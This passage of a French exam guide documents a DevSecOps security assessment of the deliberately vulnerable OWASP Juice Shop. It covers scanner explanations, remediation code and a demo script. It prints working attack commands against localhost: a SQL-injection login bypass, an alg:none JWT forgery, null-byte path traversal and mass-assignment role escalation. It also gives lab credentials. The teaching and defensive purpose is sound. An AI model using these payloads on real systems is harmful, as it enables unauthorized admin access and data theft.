- `severity` → ERROR (critique), WARNING (moyen), INFO (informatif)

**Limites importantes :**
- Un finding Semgrep est un **faux positif possible** — il faut toujours vérifier manuellement si le code est réellement exploitable
- Semgrep ne peut pas détecter les vulnérabilités IDOR ou Mass Assignment car elles dépendent de la logique applicative, pas d'un pattern de code

### 7.2 npm audit (SCA)

**Qu'est-ce que c'est ?**
npm audit compare les dépendances déclarées dans `package.json` (et résolues dans `package-lock.json`) avec la base de données des vulnérabilités npm maintenue par GitHub Security.

**Comment l'interpréter :**
```json
{
  "metadata": {
    "vulnerabilities": {
      "critical": 2,
      "high": 14,
      "moderate": 8,
      "low": 3
    }
  },
  "vulnerabilities": {
    "lodash": {
      "name": "lodash",
      "severity": "high",
      "via": [{"title": "Prototype Pollution", "url": "https://..."}]
    }
  }
}
```

**Limites importantes :**
- npm audit signale des vulnérabilités dans les dépendances, mais la plupart ne sont **pas exploitables** dans le contexte spécifique de l'application
- Une vulnérabilité "critical" dans une dépendance de test (devDependencies) n'est pas un risque en production
- Il faut toujours vérifier si le code vulnérable d'une dépendance est réellement appelé

### 7.3 OWASP ZAP (DAST)

**Qu'est-ce que c'est ?**
OWASP ZAP (Zed Attack Proxy) est un proxy de sécurité qui intercepte et analyse le trafic HTTP entre le navigateur et l'application. Il effectue un **spider** (découverte automatique des pages) puis un **scan actif** (envoi de payloads de test sur chaque paramètre).

**Phases du scan :**
1. **Spider** : ZAP découvre toutes les pages et APIs de l'application
2. **Scan actif** : ZAP envoie des payloads XSS, SQLi, Path Traversal, etc. sur chaque paramètre détecté
3. **Rapport** : ZAP génère un rapport HTML/XML/JSON avec toutes les alertes classées par sévérité

**Comment interpréter les alertes ZAP :**

| Alert Level | Signification |
|-------------|---------------|
| High | Vulnérabilité confirmée ou très probable — corriger en priorité |
| Medium | Vulnérabilité possible — vérification manuelle recommandée |
| Low | Mauvaise pratique — risque faible en isolation |
| Informational | Information sur la configuration — pas un risque direct |

**Limites importantes :**
- ZAP ne peut pas détecter les vulnérabilités nécessitant de comprendre la logique métier (IDOR : il ne sait pas qu'ID=1 appartient à l'admin)
- Le scan actif peut être lent (10-15 minutes pour une application de taille moyenne)
- ZAP génère des faux positifs, notamment sur les SPAs Angular où le contenu est généré dynamiquement

### 7.4 trufflehog (Secret Detection)

**Qu'est-ce que c'est ?**
trufflehog analyse le code source et l'historique Git à la recherche de secrets exposés. Il utilise deux approches :
1. **Détection par regex** : patterns de clés AWS (`AKIA...`), tokens GitHub (`ghp_...`), etc.
2. **Détection par entropie** : calcule l'entropie de Shannon des chaînes — une clé API aléatoire a une entropie élevée

**Comment interpréter les résultats :**
```json
{
  "SourceMetadata": {"Data": {"Filesystem": {"file": "config/keys.js", "line": 12}}},
  "SourceName": "trufflehog",
  "DetectorName": "AWS",
  "Raw": "AKIAIOSFODNN7EXAMPLE",
  "Verified": true
}
```

- `DetectorName` → type de secret détecté
- `Verified` → `true` si trufflehog a pu vérifier que le secret est actif (tentative d'appel API)
- `Raw` → la valeur du secret (à ne jamais logger en production !)

---

### 7.5 HDWP (DAST sémantique)

**Qu'est-ce que c'est ?**
HDWP (Hypothesis-Driven Web Pentesting Engine) est un moteur de test d'intrusion sémantique open-source développé en Python. Contrairement aux scanners traditionnels (ZAP, Nikto) qui travaillent par fuzzing et correspondance de signatures, HDWP modélise l'application, dérive des propriétés de sécurité formelles, et les falsifie par des expériences comportementales contrôlées.

**Pipeline HDWP :**
```
ApplicationModel  (modèle sémantique — endpoints, paramètres, rôles)
  → SecurityPropertyEngine  (propriétés formelles : "cet endpoint doit être protégé par rôle")
    → HypothesisEngine      (hypothèses falsifiables)
      → ExperimentEngine    (baseline + mutation, encoding, bypass WAF)
        → SemanticOracle    (diff comportemental : la mutation est-elle distinguable ?)
          → Findings        (classification OWASP/CWE + score de confiance ML)
```

**Configuration utilisée pour Juice Shop :**
```yaml
# juiceshop-hdwp-context.yaml
roles:
  - name: "anonymous"     # Pas de JWT
  - name: "customer"      # JWT utilisateur standard
  - name: "admin"         # JWT administrateur
plugins:
  enabled:
    - core.authorization.bola      # IDOR
    - core.authorization.authz     # Contrôle d'accès
    - core.authorization.bfla      # Broken Function Level Auth
    - core.injection.sqli          # SQL Injection
    - core.injection.xss           # Cross-Site Scripting
    - core.session_property.jwt    # Manipulation JWT
    - core.configuration.security_headers  # Headers HTTP
    # ... 22 plugins au total
options:
  allow_write: false               # Mode lecture seule — pas de SQLi/XSS actif
  max_requests_per_minute: 120
```

**Résultat du scan (11/09/2026) :**
```
Total findings : 91
  HIGH   : 10  (CWE-347 JWT alg_none × 5, CWE-284 privilege escalation × 5)
  MEDIUM : 27  (CWE-693 CSP absent)
  LOW    : 27  (CWE-346 COOP absent)
  INFO   : 27  (CWE-116 Referrer-Policy absent)
Confiance moyenne : 95.8%
Durée du scan : ~3 minutes
```

**Comment lancer le scan :**
```bash
cd /home/virus-one/Bureau/project_hdwp
source .venv/bin/activate

# Scan headless
hdwp run --context /chemin/vers/juiceshop-hdwp-context.yaml \
    --no-tui --db "sqlite+aiosqlite:///juiceshop_evidence.db"

# Générer le rapport
hdwp report --db "sqlite+aiosqlite:///juiceshop_evidence.db" --format md --output hdwp_report
```

**Limites importantes :**
- En mode `allow_write: false`, HDWP ne teste pas les vulnérabilités nécessitant des requêtes d'écriture (SQLi active, XSS stocké, Mass Assignment)
- La couverture dépend des endpoints découverts par le crawler — les endpoints nécessitant une navigation complexe (SPA Angular) peuvent être manqués
- Les scores de confiance sont calculés par un modèle ML entraîné sur des sessions précédentes — la première session peut avoir des scores moins calibrés

**Comparaison avec OWASP ZAP :**

| Critère | OWASP ZAP | HDWP |
|---------|-----------|------|
| Approche | Fuzzing par signatures | Falsification d'hypothèses sémantiques |
| Détection IDOR/BFLA | ❌ (pas de logique métier) | ✅ (diff cross-role automatique) |
| Détection JWT manipulation | ❌ | ✅ (mutations jwt_manipulation) |
| Détection XSS/SQLi active | ✅ (scan actif) | ❌ en mode allow_write=false |
| Headers manquants | ✅ | ✅ (par endpoint, avec CWE spécifique) |
| Configuration requise | Minimale (URL cible) | Rôles + JWT requis |
| Temps de scan | 10-15 min | ~3 min |

---

## 8. Interprétation des résultats

### 8.1 Rapport consolidé (`rapport_consolide.txt`)

Le rapport consolidé est généré en étape 5 du pipeline. Il agrège :

```
SECTION 1 : SAST (Semgrep)
  → nombre de findings, détails des 5 premiers

SECTION 2 : SCA (npm audit)
  → Critical: N, High: N, Moderate: N, Low: N

SECTION 3 : DAST
  → résultats des tests curl manuels ou du scan ZAP

SECTION 4 : Secret Detection
  → nombre de secrets détectés

SECTION 5 : Tests d'exploitation
  → sortie de chaque script test_*.sh

RÉSUMÉ :
  tableau des 11 vulnérabilités avec CWE, CVSS, Sévérité
  DÉCISION : REJECT DEPLOYMENT
```

### 8.2 Priorisation des vulnérabilités

Règle de priorisation utilisée (basée sur CVSS v3.1) :

| CVSS | Sévérité | Action |
|------|----------|--------|
| 9.0 – 10.0 | Critical | Bloquer le déploiement — correction immédiate |
| 7.0 – 8.9 | High | Correction requise avant déploiement |
| 4.0 – 6.9 | Medium | Correction planifiée (sprint suivant) |
| 0.1 – 3.9 | Low | Surveillance — pas bloquant |

### 8.3 Faux positifs vs vrais positifs

**Un faux positif** est une alerte levée par un outil sur du code qui n'est en réalité pas vulnérable dans le contexte de l'application. Exemples :

- Semgrep signale une "injection potentielle" sur une requête Sequelize avec `.findAll()` sans `where` dynamique → pas un vrai risque
- npm audit signale une dépendance lodash vulnérable à "prototype pollution" → Juice Shop n'expose pas les payloads utilisateur à `lodash.merge()` directement

**Comment distinguer :** Lire le code source concerné, vérifier si l'entrée utilisateur atteint effectivement le point vulnérable. Si oui → vrai positif. Sinon → faux positif.

**Un faux négatif** est une vulnérabilité réelle que l'outil n'a pas détectée. Exemples dans notre cas :
- ZAP ne détecte pas V3 (IDOR) ni V7 (Mass Assignment)
- Semgrep ne détecte pas V1 (headers manquants)
- ZAP ne détecte pas V10 (JWT alg_none) ni V11 (BFLA) — HDWP les détecte grâce à son approche sémantique cross-role

C'est pour cela que la **complémentarité des outils** (ZAP + HDWP + analyse humaine) est indispensable.

---

## 9. Guide de remédiation

### 9.1 V2 — SQL Injection → Requêtes paramétrées (`remediation/sqli_fix.js`)

**Principe :** Avec Sequelize ORM (utilisé par Juice Shop), remplacer la requête SQL par interpolation directe par une recherche Sequelize avec égalité stricte sur le champ `email`.

**Avant (vulnérable) :**
```javascript
// La valeur de email est insérée dans la chaîne SQL
db.sequelize.query(
  `SELECT * FROM Users WHERE email = '${req.body.email}' AND deletedAt IS NULL`,
  { model: UserModel, plain: true }
)
```

**Après (corrigé) :**
```javascript
// Sequelize génère en interne : WHERE email = ? (paramètre lié)
const user = await models.User.findOne({
  where: { email: email, deletedAt: null }
})
```

**Pourquoi ça marche :** Sequelize traduit `where: { email: value }` en une requête préparée avec placeholder `?`. Le driver SQLite3 lie la valeur du paramètre séparément de la requête SQL. Le payload `' OR '1'='1'--` est traité comme une chaîne de caractères littérale — aucun utilisateur n'a cet email → la requête retourne `null` → HTTP 401.

**Comment vérifier que la correction fonctionne :**
```bash
JUICE_SHOP_URL=http://localhost:3000 REPORT_DIR=/tmp/verify bash scripts/test_auth.sh
# Attendu : HTTP 401 sur le payload SQLi, [OK] SQLi rejetée
```

### 9.2 V3 — IDOR → Middleware d'autorisation (`remediation/idor_fix.js`)

**Principe :** Ajouter un middleware Express entre le middleware d'authentification (qui valide le JWT) et le handler de la route basket. Ce middleware compare l'ID du panier dans l'URL avec celui stocké dans le JWT.

**Où trouver l'ID du panier dans le JWT :**
```json
{
  "data": { "id": 1, "email": "...", "role": "customer" },
  "bid": 1    ← ici, le basket ID de l'utilisateur connecté
}
```

**Code de la correction :**
```javascript
function verifyBasketOwnership(req, res, next) {
  const requestedId = parseInt(req.params.id, 10)
  if (!req.user || req.user.data.bid !== requestedId) {
    return res.status(403).json({ error: 'Forbidden: not your basket.' })
  }
  next()
}

// Dans le routeur basket.js :
router.get('/:id', security.isAuthorized, verifyBasketOwnership, basketHandler)
```

**Pourquoi ça marche :** Le JWT est signé avec la clé privée RS256 de Juice Shop. Un attaquant ne peut pas modifier la valeur `bid` dans le JWT sans invalider la signature. Donc si `req.user.data.bid !== req.params.id`, c'est que l'utilisateur essaie d'accéder à un panier qui n'est pas le sien → HTTP 403.

**Comment vérifier :**
```bash
# Relancer EXP-02 — le panier ID=1 doit retourner 403 pour l'attaquant
JWT_ATT=$(curl -s -X POST -H "Content-Type: application/json" \
  -d '{"email":"attacker@lab.local","password":"P@ssword1!"}' \
  http://localhost:3000/rest/user/login | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")
curl -s -o /dev/null -w "HTTP %{http_code}\n" \
  -H "Authorization: Bearer $JWT_ATT" http://localhost:3000/rest/basket/1
# Attendu : HTTP 403
```

### 9.3 V7 — Mass Assignment → Whitelist de champs (`remediation/mass_assignment_fix.js`)

**Principe :** Utiliser `_.pick(req.body, ALLOWED_FIELDS)` pour extraire uniquement les champs autorisés du body de la requête, avant de les passer à `User.update()`. Le champ `role` est absent de la whitelist → silencieusement ignoré.

**Whitelist définie :**
```javascript
const ALLOWED_FIELDS = [
  'username', 'password', 'email',
  'securityQuestion', 'securityAnswer', 'profileImage'
]
// Champs interdits (non listés) : role, isActive, totpSecret, lastLoginIp, deletedAt
```

**Pourquoi `_.pick` :** C'est une fonction lodash (déjà une dépendance de Juice Shop) qui crée un nouvel objet en extrayant uniquement les clés spécifiées. Si `req.body = { email: "new@mail.com", role: "admin" }` et `ALLOWED_FIELDS = ['email']`, alors `_.pick(req.body, ALLOWED_FIELDS)` retourne `{ email: "new@mail.com" }` — `role` est ignoré.

**Pourquoi whitelist plutôt que blacklist :**
- **Blacklist** : `delete req.body.role` → risque d'oublier un nouveau champ sensible ajouté plus tard
- **Whitelist** : tout ce qui n'est pas explicitement autorisé est bloqué → défense par défaut

**Comment vérifier :**
```bash
# EXP-05 — PUT avec {"role":"admin"} doit retourner HTTP 200 MAIS role inchangé
curl -X PUT -H "Content-Type: application/json" \
  -H "Authorization: Bearer $JWT_ATT" \
  -d '{"role":"admin"}' \
  http://localhost:3000/api/Users/$USER_ID

# Vérifier le rôle après
curl -s -H "Authorization: Bearer $JWT_ATT" \
  http://localhost:3000/rest/user/whoami | python3 -c "import sys,json; print(json.load(sys.stdin)['user']['role'])"
# Attendu : "customer" (inchangé)
```

### 9.4 V1 — Headers → helmet.js + Nginx (`security-config/`)

**helmet_config.js** est à intégrer dans le fichier principal de l'application Express de Juice Shop (`server.ts`) :

```javascript
const applySecurityHeaders = require('./security-config/helmet_config')
const express = require('express')
const app = express()

applySecurityHeaders(app)  // Ajoute HSTS, CSP, Referrer-Policy...
```

**nginx_security.conf** est à utiliser si Juice Shop est derrière un reverse proxy Nginx, ce qui est la configuration recommandée en production. Nginx ajoute les headers avant que la réponse ne soit envoyée au client.

### 9.5 V10 — JWT alg_none → Forcer la vérification d'algorithme

**Principe :** Le serveur Juice Shop accepte les JWT avec `"alg": "none"` (sans signature). La correction consiste à forcer `jwt.verify()` à n'accepter que l'algorithme attendu (`RS256`).

**Avant (vulnérable) :**
```javascript
// Le serveur accepte n'importe quel algorithme, y compris "none"
jwt.verify(token, publicKey)
```

**Après (corrigé) :**
```javascript
// Forcer RS256 — rejette automatiquement alg:none, HS256, etc.
jwt.verify(token, publicKey, { algorithms: ['RS256'] })
```

**Pourquoi ça marche :** En spécifiant `algorithms: ['RS256']`, la bibliothèque `jsonwebtoken` rejette tout JWT dont le header contient un algorithme différent. Un JWT avec `"alg": "none"` est rejeté avec une erreur `JsonWebTokenError: invalid algorithm` avant même que le payload ne soit lu. Cela bloque :
- L'attaque `alg_none` (signature vide acceptée)
- L'attaque `alg_confusion` (HS256 avec la clé publique comme secret)

**Comment vérifier :**
```bash
# Générer un JWT alg_none forgé
HEADER=$(echo -n '{"typ":"JWT","alg":"none"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"data":{"id":1,"email":"admin@juice-sh.op","role":"admin"},"iat":99999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED_JWT="${HEADER}.${PAYLOAD}."

# Tester — doit retourner HTTP 401 après correction
curl -s -o /dev/null -w "HTTP %{http_code}\n" \
  -H "Authorization: Bearer $FORGED_JWT" \
  http://localhost:3000/rest/user/whoami
# Avant correction : HTTP 200 (accès admin)
# Après correction : HTTP 401 (rejeté)
```

### 9.6 V11 — BFLA → Middleware de contrôle par rôle

**Principe :** Les endpoints d'administration (/api/Complaints, /api/Cards, /rest/wallet/balance) sont accessibles par des utilisateurs ayant le rôle `customer`. La correction consiste à ajouter un middleware vérifiant le rôle avant d'autoriser l'accès.

**Code de la correction :**
```javascript
function requireRole(...allowedRoles) {
  return (req, res, next) => {
    if (!req.user || !allowedRoles.includes(req.user.data.role)) {
      return res.status(403).json({ error: 'Forbidden: insufficient privileges.' })
    }
    next()
  }
}

// Appliquer sur les routes sensibles :
router.get('/api/Complaints', security.isAuthorized, requireRole('admin'), complaintsHandler)
router.post('/api/Complaints', security.isAuthorized, requireRole('admin'), complaintsHandler)
router.get('/api/Cards', security.isAuthorized, requireRole('admin', 'accounting'), cardsHandler)
```

**Pourquoi ça marche :** Le rôle est extrait du JWT signé côté serveur — un `customer` ne peut pas le modifier sans invalider la signature RS256. Le middleware vérifie que `req.user.data.role` figure dans la liste des rôles autorisés avant de passer au handler.

---

## 10. Décision de déploiement

### 10.1 Raisonnement

La décision de déploiement repose sur la présence de vulnérabilités **Critical non corrigées**.

**Critère de blocage :** Toute vulnérabilité Critical (CVSS ≥ 9.0) ou multiple High (CVSS ≥ 7.0) non corrigée → Reject Deployment.

### 10.2 Les trois options

**Accept Deployment** — conditions :
- Zéro vulnérabilité Critical ou High
- Les Medium sont documentées avec un plan de correction

**Accept with Conditions** — conditions :
- Les Critical sont corrigées et re-testées
- Un plan daté est établi pour les High
- Un monitoring de sécurité est en place

**Reject Deployment** ← notre décision — conditions :
- Au moins une vulnérabilité Critical non corrigée
- Ou plusieurs High non adressées sur des données sensibles

### 10.3 Justification pour notre cas

```
V2  - SQL Injection     CVSS 9.8 Critical → JWT admin obtenu = accès total
V7  - Mass Assignment   CVSS 8.8 Critical → rôle admin auto-assigné
V10 - JWT alg_none      CVSS 8.2 High     → forge de JWT admin sans clé (HDWP)
V3  - IDOR              CVSS 8.1 High     → données clients exposées
V11 - BFLA              CVSS 7.6 High     → endpoints admin accessibles par customer (HDWP)
V4  - Path Traversal    CVSS 7.5 High     → documents confidentiels téléchargeables
V6  - Data Exposure     CVSS 7.5 High     → config et clés OAuth accessibles
```

Mettre cette application en production dans son état actuel signifie exposer l'intégralité des données de tous les utilisateurs à n'importe qui connaissant la vulnérabilité SQLi — ce qui est publiquement documenté sur OWASP Juice Shop. De plus, les vulnérabilités V10 et V11 découvertes par HDWP montrent que même sans SQLi, un attaquant peut forger un JWT admin (alg_none) ou accéder à des fonctions administratives via BFLA.

---

## 11. Script de démonstration vidéo

### Timing suggéré pour 7-8 minutes

---

#### [0:00–0:45] Introduction

*Script (à dire) :*
> "Je vais vous présenter l'évaluation de sécurité que j'ai réalisée sur OWASP Juice Shop, une application web délibérément vulnérable. Mon rôle est celui d'un Cybersecurity Analyst. J'ai utilisé une combinaison d'outils — Semgrep, npm audit, OWASP ZAP, trufflehog, et mon propre outil HDWP — pour identifier 11 vulnérabilités dont 2 critiques. Ma conclusion est que l'application ne peut pas être déployée en production dans son état actuel."

*Actions :*
- Ouvrir http://localhost:3000 → montrer la page d'accueil de Juice Shop
- Dire : "Voici l'application — une boutique en ligne avec authentification, paniers, feedbacks..."

---

#### [0:45–2:30] Démonstration de la vulnérabilité principale — SQL Injection (V2)

*Script :*
> "La vulnérabilité la plus critique est une injection SQL sur le formulaire de connexion. CVSS 9.8 — le score maximum. Regardons ce qui se passe quand on envoie ce payload."

*Actions dans le terminal :*
```bash
# Montrer la requête normale
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com","password":"wrong"}' \
  http://localhost:3000/rest/user/login | python3 -m json.tool
# Résultat : {"error":"...","message":"Invalid email or password."}
```

```bash
# Montrer l'exploitation SQLi
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"'--","password":"x"}' \
  http://localhost:3000/rest/user/login | python3 -m json.tool
# Résultat : JWT admin retourné → accès admin sans mot de passe
```

*Script :*
> "En remplaçant l'email par cette injection, nous obtenons un JWT administrateur sans connaître aucun mot de passe. Ce token nous donne accès à toutes les données de l'application."

*Montrer le JWT décodé :*
```bash
# Décoder la partie payload du JWT (entre les deux premiers points)
JWT="eyJ0eXAiOiJKV1Qi..."  # coller le vrai token
echo $JWT | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

---

#### [2:30–4:00] Démonstration IDOR + Path Traversal

*Script :*
> "Mais la SQL Injection n'est pas la seule vulnérabilité. Voici un IDOR — accès non autorisé aux paniers d'autres utilisateurs."

```bash
# Créer un attaquant et obtenir son JWT
# Montrer : GET /rest/basket/1 avec JWT attaquant → HTTP 200
# Montrer le contenu du panier de la victime
```

*Script :*
> "Et un path traversal — des fichiers confidentiels téléchargeables sans authentification."

```bash
# Montrer les fichiers téléchargeables
curl -s http://localhost:3000/ftp/acquisitions.md | head -5
curl -s --path-as-is http://localhost:3000/ftp/package.json.bak%2500.md | head -10
```

---

#### [4:00–6:00] Pipeline Jenkins

*Script :*
> "Pour automatiser ces contrôles de sécurité à chaque commit, j'ai mis en place un pipeline Jenkins avec 6 étapes. Voyons-le en action."

*Actions :*
1. Ouvrir http://localhost:8080 → se connecter
2. Aller sur le job → cliquer "Build Now"
3. Ouvrir la console output — montrer le défilement des logs
4. Pointer les étapes :
   - "Checkout — récupération du code"
   - "Build/Preparation — Juice Shop est accessible"
   - "Security Analysis — Semgrep + npm audit s'exécutent en parallèle"
   - "Additional Security Check — ZAP + HDWP + trufflehog en parallèle"
   - "Report Generation — consolidation"
   - "Notification — email envoyé"

*Après le build — montrer les artefacts :*
> "Les rapports sont archivés ici — on peut télécharger le rapport consolidé et voir toutes les preuves."

*Ouvrir http://localhost:8025 (MailHog) :*
> "Et l'email de notification a été envoyé et capturé par MailHog."

---

#### [6:00–7:00] Remédiation

*Script :*
> "Pour les vulnérabilités critiques, j'ai implémenté des correctifs. Pour la SQL Injection, voici la correction."

*Ouvrir `remediation/sqli_fix.js` dans l'éditeur :*
> "Le code vulnérable construisait la requête SQL avec un template literal — c'est remplacé par une requête Sequelize paramétrée. Le placeholder `?` est lié à la valeur `email` par le driver SQL — elle n'est plus jamais interprétée comme du SQL."

*Même chose pour IDOR et Mass Assignment rapidement.*

---

#### [7:00–7:45] Décision finale

*Script :*
> "Après cette évaluation, ma décision est : **Reject Deployment**. L'application présente 2 vulnérabilités Critical et 5 High non corrigées — dont 2 découvertes par HDWP : un bypass JWT alg_none et un BFLA. Avec la chaîne d'exploitation démontrée, n'importe qui peut obtenir un accès administrateur complet en quelques secondes, accéder aux données de tous les utilisateurs et compromettre l'intégralité du système."

*Ouvrir le rapport HTML (`reports/rapport_final_examen.html`) :*
> "L'analyse complète est documentée dans ce rapport de 10 sections."

---

#### [7:45–8:00] Conclusion

*Script :*
> "Ce projet démontre l'importance de la sécurité intégrée dès le développement. Un pipeline DevSecOps comme celui-ci détecte automatiquement les vulnérabilités à chaque commit, mais ne remplace pas l'analyse humaine — comme on l'a vu avec l'IDOR et le Mass Assignment qui sont passés à travers les outils automatiques. Merci."

---

## 12. Troubleshooting

### Docker ne démarre pas / erreur de socket

```bash
# Vérifier quel socket Docker utiliser
ls /home/virus-one/.docker/desktop/docker.sock
# Si présent, utiliser :
export DOCKER_HOST="unix:///home/virus-one/.docker/desktop/docker.sock"

# Puis relancer :
docker compose up -d
```

### Juice Shop ne répond pas

```bash
# Vérifier les logs du conteneur
DOCKER_HOST="unix:///home/virus-one/.docker/desktop/docker.sock" \
docker logs juiceshop --tail 30

# Attendre que "Server listening on port 3000" apparaisse
# Juice Shop peut prendre 30-60 secondes au démarrage
```

### Jenkins ne trouve pas les scripts

Les scripts sont montés via volume bind-mount dans `docker-compose.yml` :
```yaml
volumes:
  - ./scripts:/lab/scripts:ro
```
Si Jenkins ne voit pas `/lab/scripts/`, vérifier que le chemin relatif dans `docker-compose.yml` est correct.

### MailHog — port 1025 déjà utilisé

Si un autre conteneur utilise le port 1025, MailHog ne démarre pas. Solutions :
1. Arrêter l'autre conteneur utilisant le port 1025
2. Ou modifier le port dans `docker-compose.yml` : `"1026:1025"` et mettre à jour la config SMTP Jenkins

### Le Jenkinsfile échoue sur "Juice Shop inaccessible"

L'URL `http://juiceshop:3000` est le nom du service Docker (réseau interne). Cette URL fonctionne **uniquement depuis l'intérieur du réseau Docker** — Jenkins (qui est dans le réseau Docker) peut l'atteindre. Si tu exécutes les scripts en dehors de Docker, utilise `http://localhost:3000`.

### Semgrep/npm audit/trufflehog non disponibles dans Jenkins

Ces outils ne sont pas pré-installés dans l'image `jenkins/jenkins:lts`. Le pipeline gère cela avec des `|| echo "{...}" > fichier.json` — si l'outil n'est pas disponible, le stage continue en mode dégradé. Pour les installer :
```bash
# Dans le conteneur Jenkins
DOCKER_HOST="unix:///home/virus-one/.docker/desktop/docker.sock" \
docker exec -it jenkins bash
pip3 install semgrep
# ou
apt-get install -y trufflehog
```

### ngrok — Le webhook GitHub ne déclenche pas le build

Le webhook GitHub a besoin d'atteindre Jenkins via Internet. Jenkins tourne en local, donc il faut un tunnel ngrok.

```bash
# 1. Lancer ngrok
ngrok http 8080
# → Copier l'URL HTTPS (ex: https://xxxx.ngrok-free.dev)

# 2. Vérifier que le tunnel fonctionne
curl -s http://127.0.0.1:4040/api/tunnels | python3 -c "
import sys, json
for t in json.load(sys.stdin)['tunnels']:
    print(t['public_url'])
"

# 3. Mettre à jour le webhook GitHub si l'URL ngrok a changé
#    → Repo Settings → Webhooks → Edit
#    → Remplacer l'ancienne URL par la nouvelle
#    → Cliquer "Update webhook"

# 4. Tester : onglet "Recent Deliveries" dans le webhook GitHub
#    → "Redeliver" le dernier ping → doit retourner HTTP 200
```

**Attention :** l'URL ngrok change à chaque redémarrage (sauf compte payant). Il faut mettre à jour le webhook GitHub à chaque nouvelle session.

### Jenkins build FAILURE en 7 secondes

Si le build échoue immédiatement : vérifier que la branche configurée dans le job est `*/main` (pas `*/master`). Aller dans Job → Configure → Pipeline → Branch Specifier.

---

## 13. Référence rapide — commandes essentielles

```bash
# ── Variables d'environnement ──────────────────────────────────
export DOCKER_HOST="unix:///home/virus-one/.docker/desktop/docker.sock"
export JUICE_SHOP_URL=http://localhost:3000
export REPORT_DIR=/tmp/test_$(date +%s)
export LAB_SCRIPTS=/home/virus-one/cours_simac_l3/Semestre_6/Sec_data/projet/labs_v2/lab1-jenkins/scripts

# ── Docker ────────────────────────────────────────────────────
cd /home/virus-one/cours_simac_l3/Semestre_6/Sec_data/projet/labs_v2/lab1-jenkins
docker compose up -d         # Démarrer
docker compose ps            # Vérifier état
docker compose down          # Arrêter
docker compose logs -f       # Voir les logs en temps réel

# ── Tests de sécurité ─────────────────────────────────────────
mkdir -p $REPORT_DIR/evidence
bash $LAB_SCRIPTS/test_http.sh          # TEST 01 — Disponibilité
bash $LAB_SCRIPTS/test_headers.sh       # TEST 02 — En-têtes HTTP
bash $LAB_SCRIPTS/test_methods.sh       # TEST 03 — Méthodes HTTP
bash $LAB_SCRIPTS/test_auth.sh          # TEST 04 — Authentification + SQLi
bash $LAB_SCRIPTS/test_api_security.sh  # TEST 05 — Exposition APIs
bash $LAB_SCRIPTS/test_exploitation.sh  # TEST 06 — Exploits complets
bash $LAB_SCRIPTS/generate_report.sh    # Rapport consolidé

# ── Exploits manuels ──────────────────────────────────────────
# EXP-01 : SQLi → JWT admin
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"'--","password":"x"}' \
  $JUICE_SHOP_URL/rest/user/login | python3 -m json.tool

# EXP-03 : Path traversal
curl -s $JUICE_SHOP_URL/ftp/acquisitions.md | head -10
curl -s --path-as-is "$JUICE_SHOP_URL/ftp/package.json.bak%2500.md" | head -10

# Headers actuels
curl -sI $JUICE_SHOP_URL/ | grep -iE "strict|csp|referrer|x-content|x-frame"

# ── HDWP — Scan sémantique ───────────────────────────────────
cd /home/virus-one/Bureau/project_hdwp
hdwp run --context $BASE/juiceshop-hdwp-context.yaml --no-tui \
  --db sqlite:///juiceshop_evidence.db
hdwp report --db sqlite:///juiceshop_evidence.db --format md \
  --output $BASE/reports/hdwp/hdwp_report.md
hdwp report --db sqlite:///juiceshop_evidence.db --format json \
  --output $BASE/reports/hdwp/findings.json

# ── Validation syntaxe du projet ──────────────────────────────
BASE=/home/virus-one/cours_simac_l3/Semestre_6/Sec_data/examen/projet_examen
for f in $BASE/remediation/*.js $BASE/security-config/helmet_config.js; do
  node --check "$f" && echo "OK: $(basename $f)" || echo "FAIL: $(basename $f)"
done

# Jenkinsfile
curl -s http://localhost:8080/jnlpJars/jenkins-cli.jar -o /tmp/jenkins-cli.jar
java -jar /tmp/jenkins-cli.jar -s http://localhost:8080/ -auth admin:admin123 \
  declarative-linter < $BASE/Jenkinsfile

# ── ngrok + Webhook GitHub ────────────────────────────────────
ngrok http 8080                   # Lancer le tunnel (garder ouvert)
# Copier l'URL HTTPS affichée → configurer dans GitHub Webhooks
# Payload URL : https://xxxx.ngrok-free.dev/github-webhook/
# Vérifier : curl -s http://127.0.0.1:4040/api/tunnels  (API locale ngrok)

# ── Accès interfaces web ──────────────────────────────────────
# Juice Shop  : http://localhost:3000
# Jenkins     : http://localhost:8080  (admin / admin123)
# MailHog     : http://localhost:8025
# Juice Shop admin : admin@juice-sh.op / admin123
```

---

*Guide rédigé le 10 septembre 2026 — Examen Final Sécurité des Données — UNCHK*
